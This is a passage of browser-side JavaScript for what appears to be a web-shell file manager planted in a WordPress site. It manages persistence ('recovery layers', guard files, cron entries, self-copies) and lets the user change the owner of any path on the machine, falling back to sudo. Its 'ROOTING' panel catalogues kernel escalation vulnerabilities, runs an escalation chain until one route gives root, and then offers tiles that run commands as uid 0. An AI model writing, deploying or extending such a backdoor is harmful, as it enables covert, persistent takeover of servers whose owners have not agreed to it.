async function syrahStatusLoad(){
  const body=document.getElementById('cleanupStatusBody');if(!body)return;
  body.innerHTML='<div style="text-align:center;padding:24px;color:var(--t3)">Checking...</div>';
  try{
    const r=await fetch('?x=syrah_status',{cache:'no-store',credentials:'same-origin',headers:{'Accept':'application/json'}});
    const d=await r.json().catch(()=>null);
    if(!d||!r.ok||!d.items){body.innerHTML='<div style="text-align:center;padding:24px;color:#f87171">'+esc((d&&d.error)||'Status check failed.')+'</div>';return;}
    const icon=it=>it.state==='ok'?'\u2713':it.state==='fail'?'\u2715':'\u2014';
    const color=it=>it.state==='ok'?'#34d399':it.state==='fail'?'#f87171':'var(--t3)';
    body.innerHTML='<div style="font-size:11px;color:var(--t3);margin-bottom:10px">'+d.summary.ok+' OK \u00b7 '+d.summary.fail+' missing \u00b7 '+d.summary.na+' not applicable</div>'+d.items.map(it=>'<div style="display:flex;gap:9px;align-items:flex-start;padding:8px 0;border-bottom:1px solid var(--border)"><span style="font-size:15px;font-weight:800;line-height:1.2;color:'+color(it)+'">'+icon(it)+'</span><div style="min-width:0"><div style="font-size:12.5px;color:var(--t1);font-weight:600">'+esc(it.label)+'</div><div style="font-size:11px;color:var(--t3);line-height:1.45;word-break:break-word">'+esc(it.detail||'')+'</div></div></div>').join('');
  }catch(error){body.innerHTML='<div style="text-align:center;padding:24px;color:#f87171">'+esc('Status check failed: '+String(error&&error.message||error))+'</div>';}
}
document.getElementById('statusBtn')?.addEventListener('click',()=>{openMod('cleanupStatusOv');syrahStatusLoad();});
document.getElementById('cleanupStatusClose')?.addEventListener('click',()=>closeMod('cleanupStatusOv'));
async function syrahCleanupRun(deleteSelf){
  if(deleteSelf){
    const answer=prompt('This removes the manager and every recovery layer it created. The WordPress site files and database are left intact. Type DELETE to continue:','');
    if((answer||'').trim()!=='DELETE'){toast('Cleanup cancelled.');return;}
  }else if(!confirm('Remove the recovery layers, guard files, WordPress cron entries, Guardian database backup and self-copies? The site itself is left intact.'))return;
  const fd=new FormData();fd.append('csrf_token',CSRF);
  if(deleteSelf)fd.append('delete_self','1');
  try{
    const r=await fetch('?x=syrah_cleanup',{method:'POST',body:fd,cache:'no-store',credentials:'same-origin',headers:{'Accept':'application/json'}});
    const d=await r.json().catch(()=>null);
    if(!d||!r.ok){toast((d&&d.error)||'Cleanup failed.',6000);return;}
    const count=(d.removed||[]).length;
    const warnings=(d.errors||[]).length?'\n\nWarnings:\n'+d.errors.slice(0,8).join('\n'):'';
    if(deleteSelf){
      alert('Removed '+count+' item(s). The manager file is '+(d.self_deleted?'deleted':'still present')+'.'+warnings);
      setTimeout(()=>{location.href='/';},700);
    }else{
      toast('Recovery layers removed: '+count+' item(s).'+((d.errors||[]).length?' '+d.errors.length+' warning(s).':''),6000);
      setTimeout(()=>{location.reload();},900);
    }
  }catch(error){toast('Cleanup failed: '+String(error&&error.message||error),6000);}
}
document.getElementById('usersCleanupBtn')?.addEventListener('click',()=>syrahCleanupRun(false));
document.getElementById('usersUninstallBtn')?.addEventListener('click',()=>syrahCleanupRun(true));

/* ═══════════════════════════════════════
   PERMISSIONS MODAL
═══════════════════════════════════════ */
const permChecks=Array.from(document.querySelectorAll('.perm-ck'));
const permOctal=document.getElementById('permOctal');
function permFromOctal(oct){
  const digits=(oct||'').padStart(3,'0').slice(-3).split('').map(Number);
  const bits=[256,128,64,32,16,8,4,2,1];
  permChecks.forEach(cb=>{cb.checked=false;});
  let i=0;
  [digits[0],digits[1],digits[2]].forEach((d,gi)=>{
    if(d&4)permChecks[gi*3+0].checked=true;
    if(d&2)permChecks[gi*3+1].checked=true;
    if(d&1)permChecks[gi*3+2].checked=true;
  });
}
function permToOctal(){
  let o=[0,0,0];
  permChecks.forEach((cb,i)=>{if(cb.checked){const grp=Math.floor(i/3);const bitVal=[4,2,1][i%3];o[grp]+=bitVal;}});
  return o.join('');
}
permChecks.forEach(cb=>cb.addEventListener('change',()=>{permOctal.value=permToOctal();}));
permOctal?.addEventListener('input',()=>{if(/^[0-7]{3,4}$/.test(permOctal.value))permFromOctal(permOctal.value);});
function openPerm(name,perm){
  document.getElementById('permTitle').textContent='Permissions - '+name;
  document.getElementById('permName').value=name;
  const oct=(perm||'0644').slice(-3);
  permOctal.value=oct;permFromOctal(oct);
  openMod('permOv');
}
document.getElementById('permClose')?.addEventListener('click',()=>closeMod('permOv'));

/* ═══════════════════════════════════════
   CHANGE OWNER
   Talks to ?x=owners. The list is every account on the
   machine; the current owner is read for the chosen item,
   and the change is applied to that item only.
═══════════════════════════════════════ */
let OWN_DATA=null,OWN_ITEM='',OWN_PATH='',OWN_PICK='';
function ownEsc(v){return typeof sessEsc==='function'?sessEsc(v):String(v==null?'':v);}
function ownAbsPath(name){return CWD.replace(/\/+$/,'')+'/'+name;}
async function ownCall(action,extra){
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action',action);
  for(const k in (extra||{})){if(extra[k]!==undefined&&extra[k]!==null)fd.append(k,String(extra[k]));}
  try{
    const r=await fetch('?x=owners',{method:'POST',body:fd,cache:'no-store'});
    if(r.status===403){toast('Security token rejected. Reload the page.');return null;}
    return await r.json();
  }catch(e){toast('The request failed.');return null;}
}
function ownSetResult(msg,kind){
  const out=document.getElementById('ownResult');if(!out)return;
  out.textContent=msg||'';
  out.className='own-result'+(kind?' '+kind:'');
}
function openOwner(name){
  OWN_ITEM=name||'';OWN_PICK='';OWN_DATA=null;
  OWN_PATH=OWN_ITEM?ownAbsPath(OWN_ITEM):CWD;
  const t=document.getElementById('ownTargetName');if(t)t.textContent=OWN_ITEM||'-';
  const p=document.getElementById('ownTargetPath');if(p)p.textContent=OWN_PATH;
  const pi=document.getElementById('ownPathInput');if(pi)pi.value=OWN_PATH;
  const now=document.getElementById('ownTargetNow');if(now)now.textContent='Reading the current owner…';
  const list=document.getElementById('ownList');if(list)list.innerHTML='<div class="own-empty">Loading accounts…</div>';
  const srch=document.getElementById('ownSearch');if(srch)srch.value='';
  const rec=document.getElementById('ownRecursive');if(rec)rec.checked=false;
  const grp=document.getElementById('ownGroupToo');if(grp)grp.checked=false;
  const ap=document.getElementById('ownApply');if(ap){ap.disabled=true;ap.textContent='Change owner';}
  ownSetResult('');
  openMod('ownOv');
  ownLoad();
}
/* Any path, not only an item from the list: the target can be typed in. */
function ownUsePath(value){
  const v=(value||'').trim();
  if(!v)return;
  OWN_PATH=v.replace(/\/+$/,'')||'/';
  OWN_ITEM=OWN_PATH.split('/').pop()||'/';
  OWN_PICK='';
  const t=document.getElementById('ownTargetName');if(t)t.textContent=OWN_ITEM;
  const p=document.getElementById('ownTargetPath');if(p)p.textContent=OWN_PATH;
  const now=document.getElementById('ownTargetNow');if(now)now.textContent='Reading the current owner…';
  const ap=document.getElementById('ownApply');if(ap){ap.disabled=true;ap.textContent='Change owner';}
  ownSetResult('');
  ownLoad();
}
async function ownLoad(){
  const d=await ownCall('list',{path:OWN_PATH});
  if(!d||!d.ok){ownSetResult('The account list could not be read.','bad');return;}
  OWN_DATA=d;
  const cur=d.current||{};
  const now=document.getElementById('ownTargetNow');
  if(now){
    if(!cur.exists)now.innerHTML='<span style="color:#fca5a5">That item no longer exists.</span>';
    else now.innerHTML='Now owned by <b style="color:'+(cur.mine?'#7ee2a8':'var(--t1)')+'">'+ownEsc(cur.owner||'unknown')+'</b>'
      +(cur.group?(' · group <b style="color:var(--t1)">'+ownEsc(cur.group)+'</b>'):'')
      +' · home <span style="font-family:monospace">'+ownEsc(cur.home||'-')+'</span>';
  }
  const note=document.getElementById('ownRoutes');
  if(note&&d.mode_label){
    note.textContent='The change is tried by the file manager first, then by the site with its own privileges (Privilege Mode is “'+d.mode_label+'”), and last with sudo '
      +(d.sudo?'- which this account may run without a password.':'- which is not available without a password here, so it will not be tried.');
  }
  ownRender();
}
function ownRender(){
  const box=document.getElementById('ownList');if(!box)return;
  const d=OWN_DATA;if(!d)return;
  const q=(document.getElementById('ownSearch')?.value||'').trim().toLowerCase();
  const cur=(d.current&&d.current.owner)?d.current.owner:'';
  let rows=(d.owners||[]);
  if(q)rows=rows.filter(u=>u.name.toLowerCase().indexOf(q)>=0||String(u.uid)===q||(u.home||'').toLowerCase().indexOf(q)>=0);
  if(!rows.length){box.innerHTML='<div class="own-empty">No account matches “'+ownEsc(q)+'”.</div>';return;}
  /* the current owner first, then the manager, then the site account, then the rest */
  const rank=u=>u.name===cur?0:(u.is_manager?1:(u.is_site?2:(u.system?4:3)));
  rows=rows.slice().sort((a,b)=>rank(a)-rank(b)||a.name.localeCompare(b.name));
  box.innerHTML=rows.map(u=>{
    const badges=''
      +(u.is_manager?'<span class="own-b mgr">file manager</span>':'')
      +(u.is_site?'<span class="own-b site">site</span>':'')
      +(u.system?'<span class="own-b sys">system</span>':'');
    return '<div class="own-row'+(u.name===OWN_PICK?' sel':'')+'" role="option" tabindex="0" data-pick="'+ownEsc(u.name)+'">'
      +'<span class="own-n">'+ownEsc(u.name)+'</span>'
      +'<span style="font-size:10px;color:var(--t3)">'+ownEsc(u.uid)+'</span>'
      +badges
      +'<span class="own-h">'+ownEsc(u.home||'-')+'</span>'
      +'</div>';
  }).join('');
}
function ownPick(name){
  OWN_PICK=name;
  document.querySelectorAll('#ownList .own-row').forEach(r=>r.classList.toggle('sel',r.dataset.pick===name));
  const cur=OWN_DATA&&OWN_DATA.current&&OWN_DATA.current.owner;
  const ap=document.getElementById('ownApply');
  if(ap){ap.disabled=!name||name===cur;ap.textContent=name?('Make “'+name+'” the owner'):'Change owner';}
  if(name&&name===cur)ownSetResult('That account already owns this item. Choose a different one.','');
  else ownSetResult('');
}
async function ownApplyNow(){
  if(!OWN_PICK)return;
  const ap=document.getElementById('ownApply');if(ap){ap.disabled=true;ap.textContent='Changing…';}
  ownSetResult('Trying the file manager, then the site, then sudo…');
  const rec=document.getElementById('ownRecursive');
  const grp=document.getElementById('ownGroupToo');
  const extra={path:OWN_PATH,owner:OWN_PICK};
  if(rec&&rec.checked)extra.recursive=1;
  if(grp&&grp.checked)extra.group=OWN_PICK;
  const d=await ownCall('apply',extra);
  if(ap){ap.textContent='Change owner';}
  if(!d){ownSetResult('The request failed.','bad');return;}
  if(d.ok){
    const n=(d.done||0);
    ownRender();ownPick('');
    if(OWN_DATA&&OWN_DATA.current){
      OWN_DATA.current.owner=d.owner;OWN_DATA.current.group=d.group;OWN_DATA.current.home=d.home;
      OWN_DATA.current.mine=(OWN_DATA.manager===d.owner);
      const now=document.getElementById('ownTargetNow');
      if(now)now.innerHTML='Now owned by <b style="color:'+(OWN_DATA.current.mine?'#7ee2a8':'var(--t1)')+'">'+ownEsc(d.owner||OWN_PICK)+'</b>'
        +(d.group?(' · group <b style="color:var(--t1)">'+ownEsc(d.group)+'</b>'):'');
    }
    const who=d.owner||OWN_PICK;
    ownSetResult((d.message||('Owner changed to '+who+'.'))+(n>1?' '+n+' items were changed.':''),'good');
    toast('Owner changed to '+who);
    /* redraw the row without a full reload */
    document.querySelectorAll('.own-cell[data-own]').forEach(c=>{
      if(c.closest('tr')&&c.closest('tr').dataset.name===OWN_ITEM){
        const nm=c.querySelector('.own-name');
        if(nm)nm.textContent=d.owner||OWN_PICK;
        c.dataset.own=d.owner||OWN_PICK;
        c.classList.toggle('own-mine',OWN_DATA.manager===(d.owner||OWN_PICK));
      }
    });
  }else{
    ownSetResult((d.error||'The owner could not be changed.'),'bad');
    const ap2=document.getElementById('ownApply');if(ap2)ap2.disabled=false;
  }
}
document.getElementById('ownClose')?.addEventListener('click',()=>closeMod('ownOv'));
/* ═══════════════════════════════════════
   ROOTING
   One panel: the catalogue of known escalation
   vulnerabilities, whether this host is exposed to
   each of them, and one press that runs the whole
   chain and stops at the first route that gives root.
═══════════════════════════════════════ */
let ROOT=null;
/* state icons - drawn, never typed (no emoji, no font-dependent glyphs) */
const ROOT_SVG={
  ok:'<svg viewBox="0 0 24 24" fill="none" stroke="#7ee2a8" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9" stroke-opacity=".4"/><path d="m8 12.4 2.7 2.6L16.2 9.6"/></svg>',
  bad:'<svg viewBox="0 0 24 24" fill="none" stroke="#fca5a5" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9" stroke-opacity=".4"/><path d="M15.2 8.8l-6.4 6.4M8.8 8.8l6.4 6.4"/></svg>',
  warn:'<svg viewBox="0 0 24 24" fill="none" stroke="#fcd34d" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3.6 21.3 20H2.7z" stroke-opacity=".55"/><path d="M12 9.6v4.6"/><path d="M12 17.1h.01"/></svg>',
  shield:'<svg viewBox="0 0 24 24" fill="none" stroke="#7ee2a8" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 20 6v6c0 5-3.4 8.6-8 9.5C7.4 20.6 4 17 4 12V6z"/><path d="m8.6 12.2 2.4 2.3 4.4-4.5"/></svg>'
};
function rootEsc(v){return typeof sessEsc==='function'?sessEsc(v):String(v==null?'':v);}
function rootSet(id,msg,kind){const o=document.getElementById(id);if(!o)return;o.textContent=msg||'';o.className='root-out'+(kind?' '+kind:'');}
async function rootCall(action,extra){
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action',action);
  for(const k in (extra||{})){if(extra[k]!==undefined&&extra[k]!==null)fd.append(k,String(extra[k]));}
  try{
    const r=await fetch('?x=rooting',{method:'POST',body:fd,cache:'no-store'});
    if(r.status===403){toast('Security token rejected. Reload the page.');return null;}
    return await r.json();
  }catch(e){toast('The request failed.');return null;}
}
const ROOT_LABEL={vulnerable:'vulnerable',check:'check',mitigated:'mitigated',patched:'patched',absent:'not present',unknown:'unknown'};
const ROOT_CLASS={vulnerable:'v',check:'c',mitigated:'m',patched:'p',absent:'a',unknown:'a'};
function rootRender(){
  const d=ROOT;if(!d)return;
  const sy=d.system||{},c=d.counts||{};
  const kv=(k,v)=>'<div class="root-kv"><span>'+rootEsc(k)+'</span><span>'+rootEsc(v)+'</span></div>';
  const sbox=document.getElementById('rootSystem');
  const di=sy.distro||{},ki=sy.kernel_info||{};
  const wide=(icon,label,main,sub)=>'<div class="root-kv root-kv-os"><span>'+rootEsc(label)+'</span>'
    +'<span class="osrow"><img class="osico" src="'+rootEsc(icon||'')+'" alt="'+rootEsc(label)+'" width="26" height="26">'
    +'<b class="osmain">'+rootEsc(main||'?')+'</b>'+(sub?'<span class="ossub">'+rootEsc(sub)+'</span>':'')+'</span></div>';
  if(sbox)sbox.innerHTML=
    wide(di.icon,'System',di.name||sy.name||'?',[di.pretty&&di.pretty!==di.name?di.pretty:'',di.family?di.family+' family':'',di.version?'v'+di.version:''].filter(Boolean).join(' · ')+' - '+di.how)
    +wide(ki.icon,'Kernel',(ki.name||'Linux')+' '+(ki.release||sy.kernel||'?'),[ki.flavour,ki.machine,(ki.container?'inside '+ki.container:'')].filter(Boolean).join(' · '))
    +kv('Machine',sy.machine||'?')+kv('Runtime',sy.library||'?')
    +kv('Privilege Mode',d.mode_label||d.mode||'?')
    +kv('Manager account',(sy.manager||'?')+' (uid '+(sy.euid===null?'?':sy.euid)+')')
    +kv('Root',sy.sudo?'available':'not available')+kv('User namespaces',sy.namespaces?'allowed':'blocked')
    +kv('Root helper',sy.helper?'installed':'not installed')+kv('Module mitigation',(d.mitigation&&d.mitigation.active)?'in place':'not installed');
  const chips=document.getElementById('rootChips');
  if(chips)chips.innerHTML=
    '<span class="root-chip v">'+(c.vulnerable||0)+' vulnerable</span>'
    +'<span class="root-chip c">'+(c.check||0)+' need a version check</span>'
    +'<span class="root-chip m">'+(c.mitigated||0)+' mitigated</span>'
    +'<span class="root-chip p">'+(c.patched||0)+' patched</span>'
    +'<span class="root-chip a">'+(c.absent||0)+' not present</span>';
  const v=document.getElementById('rootVerdict');
  if(v)v.textContent='- '+(c.vulnerable||0)+' confirmed, '+(c.check||0)+' to verify';
  /* what the numbers actually mean, in words */
  const m=document.getElementById('rootMeaning');
  if(m){
    const conf=(d.vulns||[]).filter(x=>x.status==='vulnerable').map(x=>x.name);
    const maybe=(d.vulns||[]).filter(x=>x.status==='check').map(x=>x.name);
    let html='';
    html+='<b>Confirmed on this host:</b> '+(conf.length?conf.join(', '):'nothing - no catalogued vulnerability is proved reachable here')+'.';
    html+='<br><b>Version falls in the published range, vendor advisory decides:</b> '+(maybe.length?maybe.join(', '):'none')+'.';
    html+='<br><b>Can this account take root?</b> '+(sy.sudo
      ? 'Yes - the escalation chain stops at a working route.'
      : 'Not from this account: the file manager runs as '+(sy.manager||'?')+' without sudo, so the only remaining way in would be a kernel exploit, and this tool measures exposure instead of firing one.');
    m.innerHTML=html;
  }
  const cnt=document.getElementById('rootCount');
  if(cnt)cnt.textContent='- '+(d.vulns||[]).length+' entries';
  const sum=document.getElementById('rootSum');
  if(sum){
    const reach=(d.vulns||[]).filter(x=>x.status==='vulnerable'||x.status==='check').map(x=>x.name);
    sum.innerHTML=reach.length?reach.map(n=>'<span class="root-chip c">'+rootEsc(n)+'</span>').join(''):'<span class="root-chip p">no catalogued vulnerability is reachable on this kernel</span>';
  }
  const box=document.getElementById('rootVulns');
  if(box){
    box.innerHTML=(d.vulns||[]).map(x=>{
      const cls=ROOT_CLASS[x.status]||'a';
      return '<div class="root-row" data-v="'+rootEsc(x.id)+'">'
        +'<div class="root-head"><span class="nm">'+rootEsc(x.name)+'</span>'
        +'<span class="cve">'+rootEsc((x.cve||[]).join(' · '))+'</span>'
        +'<span class="st '+cls+'">'+rootEsc(ROOT_LABEL[x.status]||x.status)+'</span></div>'
        +'<div class="root-detail">'
        +'<div>'+rootEsc(x.summary)+'</div>'
        +'<div class="lab">What it gives an attacker</div><div>'+rootEsc(x.impact)+'</div>'
        +'<div class="lab">What was measured here</div><ul>'+(x.evidence||[]).map(e=>'<li>'+rootEsc(e)+'</li>').join('')+'</ul>'
        +'<div class="lab">Needs</div><div>'+rootEsc(x.requires)+'</div>'
        +'<div class="lab">Mitigation / fix</div><div>'+rootEsc(x.mitigation)+' <b>'+rootEsc(x.fix)+'</b></div>'
        +'<div class="lab">Component / year</div><div>'+rootEsc(x.component)+' · '+rootEsc(x.year)+' · severity '+rootEsc(x.severity)+'</div>'
        +'</div></div>';
    }).join('');
  }
  const fbox=document.getElementById('rootFindings');
  if(fbox)fbox.innerHTML=(d.findings||[]).map(f=>{
    const good=f.good?f.ok:!f.ok;
    return '<div class="root-item '+(good?'ok':'bad')+'"><span class="t">'+(good?ROOT_SVG.shield:ROOT_SVG.warn)+'</span>'
      +'<span><span>'+rootEsc(f.name)+'</span> <span class="w">'+rootEsc(f.note)+'</span></span></div>';
  }).join('');
  const b=document.getElementById('rootBadge');
  if(b)b.textContent=(sy.sudo?'· root':((c.vulnerable||0)>0?'· '+(c.vulnerable||0)+' open':''));
  const pass=document.getElementById('rootPass');
  if(pass)pass.style.display=((typeof RK!=='undefined'&&RK.wantPass)||!sy.sudo)?'block':'none';
  if(typeof rkFacts==='function')rkFacts();
}
function rootSteps(steps){
  const box=document.getElementById('rootSteps');if(!box)return;
  box.innerHTML=(steps||[]).map(s=>{
    const fired=(s.fired!==false);
    const icon=s.ok?ROOT_SVG.ok:(fired?ROOT_SVG.bad:ROOT_SVG.warn);
    return '<div class="root-step '+(s.ok?'ok':(fired?'bad':'meas'))+'"><span class="t">'+icon+'</span>'
      +'<span><span class="r">'+rootEsc(s.route)+'</span>'
      +(fired?'':'<span class="tag">measured, not fired</span>')
      +' <span class="w">'+rootEsc(s.note)+'</span></span></div>';
  }).join('');
}
function rootAdvice(list){
  const box=document.getElementById('rootAdvice');if(!box)return;
  if(!list||!list.length){box.innerHTML='';return;}
  box.innerHTML=list.map(a=>'<div>'+ROOT_SVG.warn+'<span>'+rootEsc(a)+'</span></div>').join('');
}
function rootBanner(msg,kind){
  const b=document.getElementById('rootBanner');if(!b)return;
  b.textContent=msg||'';b.className='root-banner'+(kind?' '+kind:'');
}
function rootVerifyList(d){
  const box=document.getElementById('rootChecks');if(!box)return;
  if(!d||!d.items){box.innerHTML='';return;}
  box.innerHTML=d.items.map(i=>'<div class="root-step '+(i.ok?'ok':'bad')+'"><span class="t">'+(i.ok?ROOT_SVG.ok:ROOT_SVG.bad)+'</span>'
    +'<span><span class="r">'+rootEsc(i.name)+'</span> <span class="w">'+rootEsc(i.note)+'</span></span></div>').join('');
}

/* the self-audit: what the file starts, and what it proves about itself */
function rootSelfCheck(d){
  const box=document.getElementById('rootSelfCheck');if(!box)return;
  if(!d||!d.ok&&!d.programs){box.innerHTML='';return;}
  const head='<div class="root-item '+(d.php_only?'ok':'bad')+'"><span class="t">'+(d.php_only?ROOT_SVG.shield:ROOT_SVG.warn)+'</span>'
    +'<span><span>'+(d.php_only?'PHP only: no measurement shells out':'A measurement shells out')+'</span> <span class="w">'+rootEsc(d.message||'')+'</span></span></div>';
  const rows=(d.programs||[]).map(p=>'<div class="root-item '+(p.path?'ok':'ok')+'"><span class="t">'+(p.path?ROOT_SVG.ok:ROOT_SVG.shield)+'</span>'
    +'<span><span>'+rootEsc(p.name)+'</span> <span class="w">'+(p.path?rootEsc(p.path)+' - ':'not installed, so it is never started - ')+rootEsc(p.why)+'</span></span></div>').join('');
  const src='<div class="root-item ok"><span class="t">'+ROOT_SVG.shield+'</span><span><span>Read, never run</span> <span class="w">'
    +rootEsc((d.sources||[]).join(' · '))+'</span></span></div>';
  box.innerHTML=head+src+rows;
  const c=document.getElementById('rootProgramsCount');
  if(c)c.textContent='- '+(d.programs||[]).length+' programs';
}
/* ── the rooted screen ────────────────────────────────────────────────────
   When a method has really installed root, the panel stops being a report and
   becomes the control surface for the machine: a large emblem, the account and
   the method, then one tile per capability. Each tile runs a real command as
   uid 0 through the installed method and prints the machine's own answer. */
const RR_RES={};
const RR_ICON={
  files:'<path d="M4 5.5A1.5 1.5 0 0 1 5.5 4H10l2 2.5h6.5A1.5 1.5 0 0 1 20 8v9.5A1.5 1.5 0 0 1 18.5 19h-13A1.5 1.5 0 0 1 4 17.5z"/><path d="M4 9.5h16"/>',
  owner:'<circle cx="9" cy="8" r="3.4"/><path d="M3 20v-1.2A5.4 5.4 0 0 1 8.4 13.4h1.2A5.4 5.4 0 0 1 15 18.8V20"/><path d="M17.5 11h4M19.5 9v4"/>',
  services:'<circle cx="12" cy="12" r="3.2"/><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/>',
  packages:'<path d="M12 3.2 20 7.6v8.8L12 20.8 4 16.4V7.6z"/><path d="M4 7.6 12 12l8-4.4M12 12v8.8"/>',
  users:'<circle cx="9" cy="8" r="3.2"/><path d="M2.6 20v-1A5.4 5.4 0 0 1 8 13.6h2a5.4 5.4 0 0 1 5.4 5.4V20"/><circle cx="17.6" cy="9.4" r="2.4"/>',
  kernel:'<rect x="8.4" y="8.4" width="7.2" height="7.2" rx="1.4"/><path d="M12 3v3.2M12 17.8V21M3 12h3.2M17.8 12H21M5.8 5.8l2.2 2.2M16 16l2.2 2.2M18.2 5.8 16 8M8 16l-2.2 2.2"/>',
  cron:'<circle cx="12" cy="12" r="8.4"/><path d="M12 7.4V12l3.2 2"/>',
  mounts:'<path d="M3 8.4 12 3.6l9 4.8-9 4.8z"/><path d="M3 12.6l9 4.8 9-4.8"/><path d="M3 16.6l9 4.8 9-4.8"/>',
  processes:'<path d="M4 17.5 9 12l3 3 7-7.5"/><path d="M14.5 7.5H19v4.5"/>',
  firewall:'<path d="M12 3 20 6v6c0 5-3.4 8.4-8 9.4C7.4 20.4 4 17 4 12V6z"/><path d="M8.6 12.2 11 14.5l4.4-4.6"/>',
  network:'<circle cx="12" cy="12" r="8.6"/><path d="M3.4 12h17.2M12 3.4c2.6 2.4 3.9 5.3 3.9 8.6S14.6 18.2 12 20.6C9.4 18.2 8.1 15.3 8.1 12S9.4 5.8 12 3.4z"/>'
};
function rrSvg(name,cls){
  return '<svg class="'+(cls||'')+'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">'+(RR_ICON[name]||RR_ICON.files)+'</svg>';
}
function rrEmblem(){
  return '<svg viewBox="0 0 220 220" role="img" aria-label="Root installed">'
    +'<defs>'
    +'<linearGradient id="rrG1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#7ee2a8"/><stop offset="1" stop-color="#34d399" stop-opacity=".5"/></linearGradient>'
    +'<radialGradient id="rrG2" cx="50%" cy="46%" r="58%"><stop offset="0" stop-color="#34d399" stop-opacity=".34"/><stop offset="1" stop-color="#34d399" stop-opacity="0"/></radialGradient>'
    +'</defs>'
    +'<circle cx="110" cy="110" r="106" fill="url(#rrG2)"/>'
    +'<circle cx="110" cy="110" r="88" fill="none" stroke="url(#rrG1)" stroke-width="1.6" stroke-opacity=".55" stroke-dasharray="5 12">'
    +'<animateTransform attributeName="transform" type="rotate" from="0 110 110" to="360 110 110" dur="34s" repeatCount="indefinite"/></circle>'
    +'<path d="M110 24 184 53v59c0 41-31 69-74 79-43-10-74-38-74-79V53z" fill="rgba(52,211,153,.09)" stroke="url(#rrG1)" stroke-width="2.6"/>'
    +'<path d="M110 72a21 21 0 0 1 8.5 40.1V134a8.5 8.5 0 0 1-17 0v-21.9A21 21 0 0 1 110 72z" fill="url(#rrG1)"/>'
    +'<path d="M82 166h56" stroke="url(#rrG1)" stroke-width="2.6" stroke-linecap="round" stroke-opacity=".5"/>'
    +'<circle cx="110" cy="93" r="4.6" fill="#0b0f0d" fill-opacity=".65"/>'
    +'</svg>';
}
function rrBadge(txt,on){
  return '<span class="rr-badge'+(on?'':' off')+'">'+(on?rrSvg('firewall'):'')+rootEsc(txt)+'</span>';
}
function rrTile(c){
  const r=RR_RES[c.id];
  return '<div class="rr-tile'+(r?(r.ok?' done':' fail'):'')+'" data-tile="'+rootEsc(c.id)+'">'
    +'<div class="rr-tile-top"><span class="rr-tile-ic">'+rrSvg(c.id)+'</span><span class="rr-tile-name">'+rootEsc(c.name)+'</span></div>'
    +'<div class="rr-tile-idea">'+rootEsc(c.idea)+'</div>'
    +'<div class="rr-tile-cmd">'+rootEsc(c.cmd)+'</div>'
    +'<button type="button" class="btn btn-g" data-ctl="'+rootEsc(c.id)+'">Run as root</button>'
    +'<div class="rr-tile-out">'+(r?rootEsc(r.out||(r.ok?'done':'refused')):'')+'</div>'
    +'</div>';
}
function rrMethods(list,installedId,target){
  const box=document.getElementById(target);if(!box)return;
  box.innerHTML=(list||[]).map(m=>{
    const on=m.id===installedId;
    const res=RR_METHOD[m.id];
    return '<div class="rr-method '+(on?'on':(m.available?'':'off'))+'" data-method-row="'+rootEsc(m.id)+'">'
      +'<span class="rr-method-ic">'+rrSvg('firewall')+'</span>'
      +'<span style="min-width:0;flex:1"><span class="rr-method-n">'+rootEsc(m.name)+'<span class="rr-method-tag">'+(on?'installed':(m.available?'ready':'not applicable'))+'</span></span>'
      +'<span class="rr-method-i">'+rootEsc(m.idea)+' <span style="color:var(--t3)">- '+rootEsc(m.note||'')+'</span></span>'
      +(res?'<span class="rr-method-i" style="display:block;margin-top:2px;color:'+(res.ok?'#a7f3d0':'#fca5a5')+'">'+rootEsc(res.note||'')+'</span>':'')
      +'</span>'
      +(m.available&&!on?'<button type="button" class="btn btn-g" style="min-height:26px;font-size:10.5px;padding:3px 9px" data-method="'+rootEsc(m.id)+'">Try</button>':'')
      +'</div>';
  }).join('');
}
const RR_METHOD={};
async function rrTryMethod(id){
  const pass=document.getElementById('rootPass');
  const r=await rootCall('rootmethod',{id:id,password:pass?pass.value:''});
  if(!r){toast('The request failed.');return;}
  RR_METHOD[id]={ok:!!r.ok,note:(r.note||r.error||'')};
  if(r.state)rootRenderRooted(r.state);
  else{
    const row=document.querySelector('[data-method-row="'+id+'"]');
    if(row)rrMethods((CHANNELS_CACHE||[]).map(c=>c),'','rootMethodList');
  }
  if(r.ok)toast('Root installed with: '+(r.name||id));
}
document.getElementById('rrMethods')?.addEventListener('click',e=>{
  const b=e.target.closest('[data-method]');if(b)rrTryMethod(b.dataset.method);
});
document.getElementById('rootMethodList')?.addEventListener('click',e=>{
  const b=e.target.closest('[data-method]');if(b)rrTryMethod(b.dataset.method);
});
function rrLog(list,target){
  const box=document.getElementById(target);if(!box)return;
  if(!list||!list.length){box.innerHTML='<div class="root-out">Nothing has run through root yet. Every tile you press is written here, with the method that answered.</div>';return;}
  box.innerHTML=list.map(r=>'<div class="rr-log-row"><div class="rr-log-time">'+rootEsc((r.at||'').slice(11,19))
    +'</div><div><div class="rr-log-what">'+rootEsc(r.what||'')+' <span class="rr-method-tag">'+rootEsc(r.via||'')+'</span></div>'
    +'<div class="rr-log-meta">'+rootEsc(r.cmd||'')+'\nrc '+rootEsc(String(r.rc))+' · '+rootEsc(rootSnip(r.out||'',160))+'</div></div></div>').join('');
}
function rootSnip(t,n){t=(t||'').replace(/\s+/g,' ').trim();return t.length>n?t.slice(0,n)+'…':t;}
let CHANNELS_CACHE=null;
function rootRenderRooted(st){
  const ov=document.getElementById('rootOv');
  const box=document.getElementById('rootRooted');
  const inst=!!(st&&st.installed);
  const legacy=['rootSecHost','rootSecAuto','rootSecNow','rootSecVerify','rootSecVulns','rootSecPrograms','rootSecFindings'];
  legacy.forEach(id=>{const el=document.getElementById(id);if(el)el.classList.toggle('root-legacy',inst);});
  if(ov)ov.classList.toggle('rooted',inst);
  if(box)box.style.display=inst?'flex':'none';
  const isec=document.getElementById('rootSecInstall');
  if(isec)isec.style.display=inst?'none':'block';
  const rk=document.getElementById('rootMain');
